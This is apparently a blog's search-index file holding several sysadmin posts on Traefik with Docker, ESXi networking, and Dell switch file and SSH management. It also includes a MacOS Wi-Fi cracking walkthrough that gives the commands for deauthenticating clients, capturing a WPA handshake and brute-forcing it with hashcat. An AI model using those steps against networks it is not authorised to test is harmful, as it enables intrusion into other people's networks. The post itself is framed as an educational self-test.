volumes:       # Mount docker socker from host machine       - /var/run/docker.sock:/var/run/docker.sock:ro    whoami:     # A container that exposes an API to show its IP address     image: containous/whoami     container_name: whoami     labels:       # Create a route `whoami` and bound with defined entrypoint       - traefik.http.routers.whoami.entrypoints=web       # Create rule       - traefik.http.routers.whoami.rule=Host(`whoami.example.com`)   We declare two services. First service is our traefik. Second one is a service response information about itself on web requests. Also we’ve enabled API along with the dashboard. And we can see it on localhost:8080/dashboard/.   After we append a hostname whoami.example.com to local DNS (i.e. to /etc/hosts) we can access to a created whoami container from browser by link http://whoami.example.com.   Without any changing DNS service we also could send request to whoami with curl:  # curl -H Host:whoami.example.com http://localhost  Hostname: 3b64e9ee3e38 IP: 127.0.0.1 IP: 172.28.0.2 RemoteAddr: 172.28.0.3:55870 GET / HTTP/1.1 Host: whoami.example.com User-Agent: curl/7.54.0 Accept: */* Accept-Encoding: gzip X-Forwarded-For: 172.28.0.1 X-Forwarded-Host: whoami.example.com X-Forwarded-Port: 80 X-Forwarded-Proto: http X-Forwarded-Server: a9dfe96d5877 X-Real-Ip: 172.28.0.1   2. HTTPS with Let’s Encrypt   Today almost all services are accessed by secure https connection. Installing an SSL certificate is the most common work. It also could be done with Traefik. Let’s create a compose file with next content:   version: '3'  services:   traefik:     image: traefik:v2.1     container_name: traefik     command:       - --api.dashboard=true       - --api.insecure=true       - --providers.docker=true       - --accesslog=true       - --entryPoints.web.address=:80       - --entryPoints.websecure.address=:443       # Enable ACME (Let's Encrypt): automatic SSL.       - --certificatesResolvers.letsencrypt.acme.email=user@example.com       # File or key used for certificates storage.       - --certificatesResolvers.letsencrypt.acme.storage=/acme/acme.json       # Uncomment the line to use Let's Encrypt's staging server,       - --certificatesResolvers.letsencrypt.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory       # Use a TLS-ALPN-01 ACME challenge.       # - --certificatesResolvers.letsencrypt.acme.tlsChallenge=true       # Use a HTTP-01 ACME challenge.       - --certificatesResolvers.letsencrypt.acme.httpChallenge=true       # EntryPoint to use for the HTTP-01 challenges.       - --certificatesResolvers.letsencrypt.acme.httpChallenge.entryPoint=web     ports:       # The HTTP port       - \"80:80\"       # The HTTPS port       - \"443:443\"       # The Web UI (enabled by --api.insecure=true)       - \"8080:8080\"     volumes:       - /var/run/docker.sock:/var/run/docker.sock       # ACME certificates can be stored in a JSON file that needs to have a 600 file mode       - ./acme:/acme    whoami:     # A container that exposes an API to show its IP address     image: containous/whoami     container_name: whoami     labels:       # Handle secure and insecure traffic from websecure,web entry points       - traefik.http.routers.whoami.entrypoints=websecure,web       # Accept requests that matched specific Host       - traefik.http.routers.whoami.rule=Host(`whoami.example.com`)       # Enable TLS/SSL       - traefik.http.routers.whoami.tls=true       # Bind with created certresolver `letsencrypt`       - traefik.http.routers.whoami.tls.certresolver=letsencrypt   A traefik service will call Let’s encrypt HTTP challenge to create a free SSL certificate. The server have to be explored from Internet by 80 port and specified DNS whoami.example.com. In this example to test purposes was setup a staging letsencrypt server. Comment the line with acme.caServer to use production server by default. Also don’t forget to change a mail address user@example.com to your.   3. Add BasicAuth to Dashboard   Once Traefik has found a match for the request, it can process it before forwarding it to the service. In the following example, we’ll add a BasicAuth mechanism for our route. This is done with a few additional labels on traefik service. After that you could open Dashboard by name dashboard.example.com.   version: '3'  services:   traefik:     image: traefik:v2.1     container_name: traefik     command:       - --api=true       - --api.dashboard=true       - --providers.docker=true       - --providers.docker.exposedbydefault=true       - --accesslog=true       - --entryPoints.web.address=:80       - --entryPoints.websecure.address=:443       - --certificatesResolvers.letsencrypt.acme.email=user@example.com       - --certificatesResolvers.letsencrypt.acme.storage=/acme/acme.json       # Uncomment the line to use Let's Encrypt's staging server,       - --certificatesResolvers.letsencrypt.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory       - --certificatesResolvers.letsencrypt.acme.httpChallenge=true       - --certificatesResolvers.letsencrypt.acme.httpChallenge.entryPoint=web     labels:       - traefik.http.routers.api.entrypoints=websecure,web       - traefik.http.routers.api.rule=Host(`dashboard.example.com`)       - traefik.http.routers.api.tls=true       - traefik.http.routers.api.tls.certresolver=letsencrypt       # Connect the router `api` to internal service 'api'       - traefik.http.routers.api.service=api@internal       # Declaring a middleware with name `auth`       # Declaring the user list - echo $(htpasswd -nb admin password) | sed -e s/\\\\$/\\\\$\\\\$/g       - \"traefik.http.middlewares.auth.basicauth.users=admin:$$apr1$$mW/l73Bf$$WsprkCzl5.QbLdY9c4kdB0\"       # Referencing an `auth` middleware       - traefik.http.routers.api.middlewares=auth     ports:       - \"80:80\"       - \"443:443\"     volumes:       - /var/run/docker.sock:/var/run/docker.sock       - ./acme:/acme    whoami:     # A container that exposes an API to show its IP address     image: containous/whoami     container_name: whoami     labels:       - traefik.http.routers.whoami.entrypoints=websecure,web       - traefik.http.routers.whoami.rule=Host(`whoami.example.com`)       - traefik.http.routers.whoami.tls=true       - traefik.http.routers.whoami.tls.certresolver=letsencrypt   Let’s explain what we made upper. First, we remove the insecure api (specifying --api instead of --api.insecure). We declare a tls connection to api router that we made in previous part. After that we bound the router with internal api service. Declaring a Middleware with name auth (traefik.http.middlewares.auth.basicauth.users). The value of it was include a string in format username:xxxx. It could be generated with shell command - echo $(htpasswd -nb username password) | sed -e s/\\\\$/\\\\$\\\\$/g. And at the end, join the middleware to the router api (traefik.http.routers.api.middlewares=auth).      4. HTTPS Redirection   Now that we have HTTPS routes, let’s redirect every non-https requests to their https equivalent. For that, we’ll reuse the previous trick and add just 3 labels to declare a redirect middleware. RedirectScheme will help us. It redirects request from a scheme to another. We will catch requests only for specific domain - whoami.example.com. See the example below:   version: '3'  services:   traefik:     image: traefik:v2.1     container_name: traefik     command:       - --api=true       - --api.dashboard=true       - --providers.docker=true       - --providers.docker.exposedbydefault=true       - --accesslog=true       - --entryPoints.web.address=:80       - --entryPoints.websecure.address=:443       - --certificatesResolvers.myresolver.acme.email=r.gainanov@skoltech.ru       - --certificatesResolvers.myresolver.acme.storage=/acme/acme.json       # Uncomment the line to use Let's Encrypt's staging server,       - --certificatesResolvers.myresolver.acme.caServer=https://acme-staging-v02.api.letsencrypt.org/directory       - --certificatesResolvers.myresolver.acme.httpChallenge=true       - --certificatesResolvers.myresolver.acme.httpChallenge.entryPoint=web     labels:       - traefik.http.routers.api.entrypoints=websecure,web       - traefik.http.routers.api.rule=Host(`dashboard.example.com`)       - traefik.http.routers.api.tls=true       - traefik.http.routers.api.tls.certresolver=letsencrypt       - traefik.http.routers.api.service=api@internal       - traefik.http.routers.api.middlewares=auth       - \"traefik.http.middlewares.auth.basicauth.users=admin:$$apr1$$mW/l73Bf$$WsprkCzl5.QbLdY9c4kdB0\"       # Declaring a middleware with name `https_redirect` uses Redirecting the Client to a `https` Scheme       - traefik.http.middlewares.https_redirect.redirectscheme.scheme=https       # Set the permanent option to true to apply a permanent redirection.       - traefik.http.middlewares.https_redirect.redirectscheme.permanent=true     ports:       - \"80:80\"       - \"443:443\"     volumes:       - /var/run/docker.sock:/var/run/docker.sock:ro       - ./acme:/acme    whoami:     # A container that exposes an API to show its IP address     image: containous/whoami     container_name: whoami     labels:       traefik.http.routers.app.rule: Host(`whoami.example.com`)       traefik.http.routers.app.entrypoints: web       # Set the middleware `https_redirect` to `app` router to apply a redirection to https.       traefik.http.routers.app.middlewares: https_redirect        traefik.http.routers.appsecured.rule: Host(`whoami.example.com`)       traefik.http.routers.appsecured.entrypoints: websecure       traefik.http.routers.appsecured.tls: true       traefik.http.routers.appsecured.tls.certresolver: myresolver   We use the previous example and add middlewares.https_redirect as traefik service label. After we bind this middleware to a router defined in whoami - traefik.http.routers.app.middlewares: https_redirect.   Follow to next advice if want a global redirect rule for requests to all insecured hosts. Move 2 rows from whoami service into traefik label’s section .app.rule, .app.entrypoints and .app.middlewares. And change the value of the Rule .rule: Host(`whoami.example.com`) to HostRegexp(`{host:.+}`)   Conclusion   Hopefully, I’ve gone through important questions you’ll have when dealing with Traefik 2.0 in a Docker setup, and I hope this examples get you a start point to explore more complex configurations.   Additional information      Official Documentation - the start point to know more about Traefik   Basic Example - Traefik - docker-compose basic example by Traefik   Docker Configuration Reference - configure Traefik with Docker Labels   Traefik 2.0 &amp; Docker 101 - step by step with Traefik in an author blog   ","categories": ["devops"],
        "tags": ["docker","devops","ssl","letsencrypt","traefik"],
        "url": "https://gainanov.pro/eng-blog/devops/docker-web-service-with-traefik/",
        "teaser": "https://gainanov.pro/eng-blog/assets/images/traefik/traefik_docker_ssl_logo.png"
      },{
        "title": "ESXi. Create and configure Management Network using ESXi Command line",
        "excerpt":"I want to continue my last post about esxcli tool. Here is I’ll describe some useful console commands that will helps you to create a management network adapter (VMkernel) and configure them. In addition commands to work with Port Groups, vSwitches, NetStack, Uplinks will be placed here in the one quick post.   Network device (Uplink)      List network devices   # esxcli network nic list  Name    PCI Device    Driver  Admin Status  Link Status  Speed  Duplex  MAC Address         MTU  Description ------  ------------  ------  ------------  -----------  -----  ------  -----------------  ----  ---------------------------------------------------------------- vmnic0  0000:81:00.0  ixgben  Up            Up           10000  Full    7c:d3:0a:00:00:00  1500  Intel Corporation 82599EB 10-Gigabit SFI/SFP+ Network Connection vmnic1  0000:81:00.1  ixgben  Up            Down             0  Half    7c:d3:0a:00:00:00  1500  Intel Corporation 82599EB 10-Gigabit SFI/SFP+ Network Connection vmnic2  0000:01:00.0  igbn    Up            Up            1000  Full    a0:36:9f:00:00:00  1500  Intel Corporation Ethernet Server Adapter I350-T2 vmnic3  0000:01:00.1  igbn    Up            Down             0  Half    a0:36:9f:00:00:00  1500  Intel Corporation Ethernet Server Adapter I350-T2   Virtual Switch (vSwitch)      List standard virtual switches:   # esxcli network vswitch standard list  vSwitch0    Name: vSwitch0    Class: cswitch    Num Ports: 10496    Used Ports: 6    Configured Ports: 128    MTU: 1500    CDP Status: listen    Beacon Enabled: false    Beacon Interval: 1    Beacon Threshold: 3    Beacon Required By:    Uplinks: vmnic2    Portgroups: WAN network, Management      Add an uplink (remove - the same)   esxcli network vswitch standard uplink add -v vSwitch0 -u vmnic0      Create a new vSwitch (remove - the same)   esxcli network vswitch standard add -v vSwitch_New   Network Stack (NetStack)      List an existing network stack   # esxcli network ip netstack list  defaultTcpipStack    Key: defaultTcpipStack    Name: defaultTcpipStack    State: 4660      Add a new stack (remove - the same)   esxcli network ip netstack add -N New_Stack   Port Group      List port groups   # esxcli network vswitch standard portgroup list  Name           Virtual Switch  Active Clients  VLAN ID -------------  --------------  --------------  ------- Management     vSwitch0                     1        0 VM network     vSwitchLAN                   1        0 WAN network    vSwitch0                     1       98      Add a new port group (remove - the same)   esxcli network vswitch standard portgroup add -p New_Management -v vSwitch_New   Network Interface (vmk nic)      List VMkernel interfaces   # esxcli network ip interface list  vmk0    Name: vmk0    MAC Address: 00:50:56:6c:01:11    Enabled: true    Portset: vSwitch0    Portgroup: Management    Netstack Instance: defaultTcpipStack    VDS Name: N/A    VDS UUID: N/A    VDS Port: N/A    VDS Connection: -1    Opaque Network ID: N/A    Opaque Network Type: N/A    External ID: N/A    MTU: 1500    TSO MSS: 65535    RXDispQueue Size: 1    Port ID: 33554443      List them IP settings   # esxcli network ip interface ipv4 get  Name  IPv4 Address  IPv4 Netmask   IPv4 Broadcast  Address Type  Gateway      DHCP DNS ----  ------------  -------------  --------------  ------------  -----------  -------- vmk0  192.168.1.11  255.255.255.0  192.168.1.255   STATIC        192.168.1.1     false      Add a new vmkernel interface   esxcli network ip interface add -i vmk2 -p New_Management -N New_Stack      Configure the new vmkernel interface   esxcli network ip interface ipv4 set -i vmk2 -I 172.16.1.111 -N 255.255.255.0 -t static -g 172.16.1.25      Set default Gateway   esxcfg-route -a default 172.16.1.25      Mark vmk2 for Management traffic   esxcli network ip interface tag add -i vmk2 -t Management   Search Domains (DNS)      List a DNS servers   # esxcli network ip dns search list     DNSSearch Domains: 192.168.1.1      Add a new DNS   esxcli network ip dns search -d 8.8.8.8 -N New_Stack   Network Troubleshooting commands   vmkping is one of them. This command allows us to use the IP stack of VMkernel interface to send a ping command to another VMkernel interface. Like this you can check if the remote site (remote host) reply on this VMkernel.   Let’s describe our scenario. I’m connected via Putty to my esxi host on 192.168.1.11 and I’ll be pinging by using vmk0 another host in LAN on 192.168.1.22.  # vmkping -I vmk0 192.168.1.22  PING 192.168.1.22 (192.168.1.22): 56 data bytes 64 bytes from 192.168.1.22: icmp_seq=0 ttl=64 time=0.583 ms 64 bytes from 192.168.1.22: icmp_seq=1 ttl=64 time=0.406 ms  --- 192.168.1.22 ping statistics --- 2 packets transmitted, 2 packets received, 0% packet loss round-trip min/avg/max = 0.406/0.494/0.583 ms   Additional information      Виртуализация - Некоторые полезные команды ESXCLI в VMware ESXi 5.0, чтобы побольше узнать о хосте и окружении   Remove and Re-Create Management Network (vmk0) VMkernel interface using ESXi Command line   Utilize vSphere CLI Commands to Troubleshoot ESXi Network Configurations   ESXi Commands List - networking commands   ","categories": ["sysad"],
        "tags": ["esxi","vm","networks"],
        "url": "https://gainanov.pro/eng-blog/sysad/esxi-cli-networking/",
        "teaser": null
      },{
        "title": "Hacking. Wi-Fi Penetration on MacOS",
        "excerpt":"   Disclaimer: this post for education purposes only.    A wireless network with WPA/WPA security not guarantee a total safety. WiFi packets could be sniffed by an attacker that can stole a WiFi passwords, then he connects to your secured network. But he is need to decode a hash of password. The complexity and time to get a password phrase completely depends on the password. Passwords consists only digits cracks minutes or hours, the password “HasGUS%f@$SAfga63efSA%$S(SACSASj)” require a hundred years to crack it.   MacOS isn’t known as an ideal operating system for hacking without customization, but it includes native tools that allow easy control of the Wi-Fi radio for packet sniffing. Changing channels, scanning for access points, and even capturing packets all can be done from the command line.   This manual show a manual to crack WiFi password from my MacBook Pro with MacOS 10.13 (HighSierra). I want to save the instruction to the future. If you want to repeat it you should familiar with console terminal.   Let’s start cracking ;)   installation requirements           Install Homebrew       Install aircrack-ng     brew install aircrack-ng           Generate a link of the next installed by built-in utility - airport for using directly on terminal.     sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport           Install hashcat     brew install hashcat           Install hashcat-utils. Build from sources. Use git and gcc     git clone https://github.com/hashcat/hashcat-utils.git cd hashcat-utils/src gcc -o cap2hccapx cap2hccapx.c mv ./cap2hccapx /usr/local/bin/           Install hcxtools     brew install hcxtools           Install wireshark     brew install wireshark                Install [JamWifi][https://github.com/0x0XDev/JamWiFi] app. It is a deauthenticating application in which unwanted clients from a Wi-Fi network have to keep off, jamming and especially their connection will be departed like dust in a second. Download and unzip by this link.       Test that all tools installed and available. The commands below should success return some help page about itself:     airport -h aircrack-ng --help cap2hccapx -h hashcat -h hcxhash2cap -h tcpdump -h wireshark -h           identify the target access point      About the abbreviation         Basic Service Set Identifier (BSSID).     Service Set Identifier (SSID).     Radio Frequency (Channel).     Access Point (AP).              Turn on Wi-Fi.            Open Terminal.       Run a command     sudo airport -s          Now, this command will be scanning the available Wi-Fi.            Wait till the installation is done.  I want to hack my network named Ruslan Gainanov and BSSID 6e:57:ca:24:09:8c and channel 1.       Copy the BSSID (my BSSID=6e:57:ca:24:09:8c) of the target Access Point.     export BSSID=6e:57:ca:24:09:8c           capturing a traffic      Run a command to help find a wireless interface (en0)     networksetup -listallhardwareports          The result:      Hardware Port: Wi-Fi Device: en0 Ethernet Address: .......           Disassociate a network     sudo airport -z           Set the channel. Do not put a space between -c and the channel     sudo airport -c1           Capture a beacon frame from the access point. This command will create a new file beacon.cap, which is the gathered data from the target access point.     sudo tcpdump \"type mgt subtype beacon and ether src $BSSID\" -I -c 1 -i en0 -w beacon.cap                Deauth connected devices with Jam Wi-Fi app. Open the app. Press Scan, chose the target network and press Monitor, then press Do It! to restart all connections. Wait 15 seconds and press Done        When you “Done” with death, run quickly next command. You have to capture a handshake in time     sudo tcpdump \"ether proto 0x888e and ether host $BSSID\" -I -U -vvv -i en0 -w handshake.cap          Wait until you see some gotten frames, like this      Got 19          After you have it press \"Control + C\" to stop capturing.       Merge the Beacon and Handshake     mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap           brute forcing          Brute Force — A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly.     Wordlist — A written collection of all words derived from a particular source.      .1. Generating HCCPAX File  cap2hccapx capture.cap capture.hccapx  Hashcat doesn’t take cap files, only hccapx files. So we need convert this files. Other way to made it is use a online tool.   Review the result. You should see the phrase Networks detected: X... Written X WPA Handshakes. The example of success result is:  Networks detected: 1 [*] BSSID=6e:57:ca:24:09:8c ESSID=Ruslan Gainanov (Length: 15) --&gt; STA=14:16:9e:67:7e:c5, Message Pair=0, Replay Counter=1 --&gt; STA=14:16:9e:67:7e:c5, Message Pair=2, Replay Counter=1 --&gt; STA=14:16:9e:67:7e:c5, Message Pair=0, Replay Counter=1 --&gt; STA=14:16:9e:67:7e:c5, Message Pair=2, Replay Counter=1  Written 4 WPA Handshakes to: capture.hccapxn   .2. Now, everything are right to execute the hashcat. We can use a wordlist or a pattern to broke a password. Using a wordlist (example of wordlists - https://github.com/kennyn510/wpa2-wordlists.git):  hashcat -m 2500 capture.hccapx wordlist.txt  Using a pattern - 8 digits:  hashcat -m 2500 -a3 capture.hccapx \"?d?d?d?d?d?d?d?d\"  For more examples press here. For more patterns, see the documentation.   my results   I use the hashcat with pattern, that works on GPU. On my MacBook Pro, it yields a performance of 41kH/s: it tests 41000 passwords in a second.      OpenCL Platform #1: Apple ========================= * Device #1: Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped. * Device #2: Intel(R) HD Graphics 630, 384/1536 MB allocatable, 24MCU * Device #3: AMD Radeon Pro 555 Compute Engine, 512/2048 MB allocatable, 12MCU  Speed.#2.........:     6578 H/s (6.48ms) @ Accel:8 Loops:4 Thr:256 Vec:1 Speed.#3.........:    35286 H/s (10.78ms) @ Accel:32 Loops:16 Thr:256 Vec:1 Speed.#*.........:    41864 H/s   The cracking a WiFi password consists 8 digits took me twenty minutes (20 mins, 17 secs).   12822b8013c116a3dff33d4bbc3fb2cb:6e57ca24098c:14169e677ec5:Ruslan Gainanov:12345670  Session..........: hashcat Status...........: Cracked Hash.Type........: WPA-EAPOL-PBKDF2 Hash.Target......: capture.hccapx Time.Started.....: Fri Jul 17 18:11:20 2020 (20 mins, 17 secs) Time.Estimated...: Fri Jul 17 18:31:37 2020 (0 secs) Guess.Mask.......: ?d?d?d?d?d?d?d?d [8] Guess.Queue......: 1/1 (100.00%) Speed.#2.........:     6583 H/s (6.76ms) @ Accel:8 Loops:4 Thr:256 Vec:1 Speed.#3.........:    33997 H/s (10.02ms) @ Accel:32 Loops:16 Thr:256 Vec:1 Speed.#*.........:    40580 H/s Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 49397760/100000000 (49.40%) Rejected.........: 0/49397760 (0.00%) Restore.Point....: 4620288/10000000 (46.20%) Restore.Sub.#2...: Salt:0 Amplifier:3-4 Iteration:0-2 Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:1-3 Candidates.#2....: 32303174 -&gt; 31682841 Candidates.#3....: 18328292 -&gt; 15530236  Started: Fri Jul 17 18:11:13 2020 Stopped: Fri Jul 17 18:31:39 2020                              Is true that my network named Ruslan Gainanov has a password - 12345670.   conclusion   Please be aware that attacking Wi-Fi Protected Access (WPA) is illegal unless you have permission from the owner’s access point or affiliation involved. This post should be used as Educational Purposes, to help the public understand how hackers take advantage of your access.   additional information      Youtube Video - video example of hacking WiFi password   Hacking: Aircrack-ng on Mac OsX - Cracking wi-fi without kali in parallels - the blog article that I based   Hacking: Wi-Fi Penetration on MacOS - another good article on Medium   Cracking WPA/WPA2 with hashcat - brief manual of hashcat using   New attack on WPA/WPA2 using PMKID - a new technique to crack WPA PSK without capturing a full EAPOL 4-way handshake   ","categories": ["sysad"],
        "tags": ["wifi","security","linux","macos"],
        "url": "https://gainanov.pro/eng-blog/sysad/wifi-cracking/",
        "teaser": null
      },{
        "title": "DELL. File Management on S4048 switch (OS9-series system)",
        "excerpt":"This article I will continue speaking about DELL PowerSwitch S4048-ON. Recently have been showed a many helpful commands for working in console. There is I want to say more about file system and files management on this switch series.   Local and remote file system   The Dell Networking system can use the internal Flash, external Flash, or remote devices to store files. Rename, delete, and copy files on the system from EXEC Privilege mode. The system stores files on the internal Flash by default but can be configured to store files elsewhere.   show file-systems   To view file system information, use the following command - .  DellEMC# show file-systems        Size(b)     Free(b)      Feature      Type   Flags  Prefixes    2368282624  2304512000        FAT32 USERFLASH      rw  flash:             -           -  unformatted USERFLASH      rw  fcmfs:     218103808    64708608      Unknown  NFSMOUNT      rw  nfsmount:             -           -            -   network      rw  ftp:             -           -            -   network      rw  tftp:             -           -            -   network      rw  scp:             -           -            -   network      rw  http:             -           -            -   network      rw  https:   Operations with local Filesystem   dir   Display the files in a file system. The default is the current directory.   DellEMC# dir  Directory of flash:    1  drwx       4096   Jan 01 1980 00:00:00 +00:00 .     2  drwx       3580   Jul 18 2020 22:09:12 +00:00 ..     3  drwx       4096   Dec 10 2019 14:49:54 +00:00 TRACE_LOG_DIR     4  drwx       4096   Dec 10 2019 14:49:54 +00:00 CONFD_LOG_DIR     5  drwx       4096   Dec 10 2019 14:49:54 +00:00 CORE_DUMP_DIR     6  d---       4096   Dec 10 2019 14:49:54 +00:00 ADMIN_DIR     7  drwx       4096   Dec 10 2019 14:49:54 +00:00 RUNTIME_PATCH_DIR     8  -rwx          1   Jul 03 2020 22:54:24 +00:00 boots.txt     9  drwx       4096   Jul 14 2020 15:28:26 +00:00 CONFIG_TEMPLATE    10  -rwx          0   Jul 14 2020 15:28:56 +00:00 pdtrc.lo0    11  -rwx       4276   Jul 14 2020 15:29:04 +00:00 last-cold-st-config    12  -rwx       4435   Jul 03 2020 23:45:50 +00:00 startup-config    13  -rwx     314038   Jul 03 2020 23:45:54 +00:00 confd_cdb.tar.gz    14  -rwx         56   Jul 03 2020 23:45:54 +00:00 confd_cdb.tar.gz.version    15  -rwx          0   Jul 14 2020 15:28:26 +00:00 earlyCliParserDbg    flash: 2368282624 bytes total (2304438272 bytes free)   mkdir/rmdir   To create a directory on file system uses mkdir, to remove - rmdir  DellEMC# mkdir tmp_dir  DellEMC# dir tmp_dir Directory of flash:/tmp_dir    1  drwx       4096   Jul 18 2020 22:35:30 +00:00 .     2  drwx       4096   Jan 01 1980 00:00:00 +00:00 ..    DellEMC# rmdir tmp_dir Proceed to remove the directory [confirm yes/no]: y     DellEMC# dir tmp_dir   % Error: The specified file or directory does not exist.   cd/pwd   To change the default directory, use the following command.  cd directory   Display the current working directory.  pwd   copy   Copy one file to another location. Dell EMC Networking OS supports IPv4 and IPv6 addressing for FTP, HTTP, TFTP, and SCP (in the hostip field).   Syntax: copy source-file-url destination-file-url   Example:  DellEMC# copy startup-config startup-config.2 ! 4435 bytes successfully copied   rename   Rename a file in the local file system.  DellEMC# rename startup-config.2 startup-config.3   show file   To show a content of text file use show file command. It will print a file into stdout of console. Example:  DellEMC# show file startup-config.3  ! Version 9.13(0.1) ! Last configuration change at Fri Jul  3 23:43:25 2020 by default ! Startup-config last updated at Fri Jul  3 23:45:50 2020 by default ! boot system stack-unit 1 primary system: A: boot system stack....   delete   Delete a file from the flash. After deletion, files cannot be restored.   Syntax: delete [flash://]filepath [no-confirm]     no-confirm - does not require user input for each file prior to deletion.   Example:  DellEMC# delete flash://startup-config.2 Proceed to delete startup-config.2 [confirm yes/no]: y  DellEMC# delete startup-config.3 no-confirm   save   The save command save the output of show command into file on flash memory. The save entry must always be the last option.   For example:  DellEMC# show command-history | save flash://command-history.txt Start saving show command report .......  DellEMC# dir command-history.txt Directory of flash:   1  -rwx      76096   Jul 18 2020 22:30:16 +00:00 command-history.txt   Copy file from/to remote network device   Files can be copied from many places. You should input the URL to desired place.     ftp: ftp://userid:password@hostip/filepath   http: http://hostip/filepath   nfsmount: nfsmount:///filepath   scp: scp://userid:password@hostip/filepath   tftp: tftp://hostip/filepath   When copying a file to a remote location (for example, scp), enter only the keywords and DellOS prompts you need for the rest of the information. For example, you can enter copy running-config scp:   To copy a file to NFS server the remote directory need to be mounted. Use a command mount nfs. For example, mount nfs  DellEMC# mount nfs 192.168.101.2:/dell_shared /dell_shared   Examples:     Copy from remote system to flash: by SCP     DellEMC# copy scp://admin:some_strong_password@192.168.101.2/firmware.bin  flash://firmware.bin ! 65059 bytes successfully copied           Copy back (from local to remote)     DellEMC# copy running-config scp://admin:some_strong_password@192.168.101.2/ ! 4324 bytes successfully copied           verify   Validate a file on the flash drive after it has been transferred to the system.   Syntax: verify {md5|sha256} file [hash-value] Parameters:     md5 - to use the MD5 message-digest algorithm.   sha256 - to use the SHA256 Secure Hash Algorithm   file - a filename that will verified   hash-value - the hash that has gotten on the remote system   Example:  DellEMC# verify md5 firmware.bin 4659f3b278b52fb09c7ed759b2f10474 MD5 hash VERIFIED for firmware.bin   Conclusion   As you can see above many of Dell commands seems on Unix shell commands. In this post I would like to save in the “memory” my experience in file management Operations. I test it on the Dell Networking OS9 switch, so it helps you easy find a desired command in one page. This quick and small manual to work with files, firmware and cofigs without handling big official papers. Besides to know more about this commands see the links in the next section.   Additional information      How to manage files (Copy and Delete) on Dell Networking Force10 switches - some short note about managing files on Dell site   PowerSwitch S4048-ON Documentation - a page that consists all documentation for the 10G switch of Dell company   DELL EMC NETWORKING S4048-ON SWITCH - Dell spec sheet for S4048–ON switch   Dell Command Line Reference Guide for the S4048–ON System - Dell man page included full command list   Dell Configuration Guide for the S4048–ON System - almost two thousands pages about configuration of Dell switch   ","categories": ["sysad"],
        "tags": ["dell","networks"],
        "url": "https://gainanov.pro/eng-blog/sysad/dell-file-management/",
        "teaser": null
      },{
        "title": "DELL. Setup SSH server on OS9 switch (S4048 10G switch)",
        "excerpt":"Yet another technical post about DELL PowerSwitch S4048-ON that I am configuring.   Secure shell (SSH) is a protocol for secure remote login and other secure network services over an insecure network. Dell Networking OS is compatible with SSH versions 1.5 and 2, in both the client and server modes. SSH sessions are encrypted and use authentication.   The RSA-SSH authentication permits the user to establish an SSH session without entering a password. This allows the user to use a custom script, for example, to automatically launch an SSH session to a Force10 switch, eliminating the potential security vulnerability of including a password in the script.   Prerequisites   If you just unpack you will get an empty switch that does not listen any network connection. Firstly you should get a console cable. My switch has a micro USB interface on front-panel for console connection. So I’m plug-in a usual USB cable into this port, then install a drivers for COM-ports and connect to the switch with this settings:  115200-baud rate No parity 8 data bits 1 stop bits No flow control   If you have seen an input invitation like this:  DellEMC#  You can start to configure a network interfaces and SSH server.   Create user   Enter to CONF mode with conf command.   Create a user with name admin and privilege level 15 (&lt;password&gt; enter the strong password here).  Dell(config)# username admin password &lt;password&gt; privilege 15  The privilege level need to restrict access to commands. This level should between from 0 to 15. The default privilege level is 1.  The user with privilege level 15 is like root without any restrictions. It allows to access to the system begins at EXEC Privilege mode, and all commands are available.   Configure Management interface   A Management interface need to remote configure and run commands on the switch. It use static or dynamic IP address.   Let’s add an IP 10.0.0.1/24 to the first management interface. Then enable it and exit.  Dell(config)# interface managementethernet 1/1 Dell(conf-if-ma-0/0)# ip add 10.0.0.1/24 Dell(conf-if-ma-0/0)# no shutdown Dell(conf-if-ma-0/0)# exit   Configure SSH server   Enable SSH   Just input this command  Dell(config)# ip ssh server enable Dell(config)# ip ssh server version 2   Generate keys   Generate keys for the SSH server  Dell(config)# crypto key generate rsa   Enable password auth   Enable a password authentication  Dell(config)# ip ssh password-authentication enable   Enable SSH-RSA password auth   Enable a RSA authentication  Dell(config)# ip ssh rsa-authentication enable   Copy your public part of RSA-key (.ssh/id_rsa.pub) into internal flash:// memory from remote host (10.0.0.3)  Dell# copy scp://username:password@10.0.0.3/.ssh/id_rsa.pub flash://id_rsa.pub   Add authentication with this key  Dell# ip ssh rsa-authentication my-authorized-keys flash://id_rsa.pub  Creating ADMIN_DIR/ssh RSA keys added to user's list of authorized-keys. Delete the file flash://id_rsa.pub : (yes/no) ? yes   Try to connect   So we configure an management IP of switch - 10.0.0.1. You can now SSH to the switch using RSA authentication. The user will encrypt the initial connection using the private key, which the switch will authenticate using the public key; no password exchange is necessary.  $ ssh admin@10.0.0.1  If it will successfully you see the hostname of device - Dell#.   Display SSH connection information   In the end of configuring I want to show a status of SSH with command show ip ssh  Dell# show ip ssh  SSH server                : enabled. SSH server version        : v2. SSH server vrf            : default. SSH server ciphers        : aes256-ctr,aes256-cbc,aes192-ctr,aes192-cbc,aes128-ctr,aes128-cbc,3des-cbc. SSH server macs           : hmac-sha2-256,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96. SSH server kex algorithms : diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1,diffie-hellman-group14-sha1. Password Authentication   : enabled. Hostbased Authentication  : disabled. RSA       Authentication  : enabled. Challenge Response Auth   : disabled.    Vty          Encryption      HMAC            Remote IP *  0            aes128-ctr      hmac-sha2-256   10.0.0.2   Conclusion   In this article I want to show how to enable SSH-server on Dell Networking system. Also this setup make possible to secure communicate with the device without any passwords. It uses RSA-SSH authentication and connection with imported public (id_rsa) keys.   Additional information      SSH Key Auth on Dell PowerConnect Switches - another blog post with the similar problem   Dell Command Line Reference Guide for the S4048–ON System - dell man page included full command list   ","categories": ["sysad"],
        "tags": ["dell","networks","security"],
        "url": "https://gainanov.pro/eng-blog/sysad/dell-ssh-server-configure/",
        "teaser": null
      },{
        "title": "DELL. Disabling SupportAssist on switch",
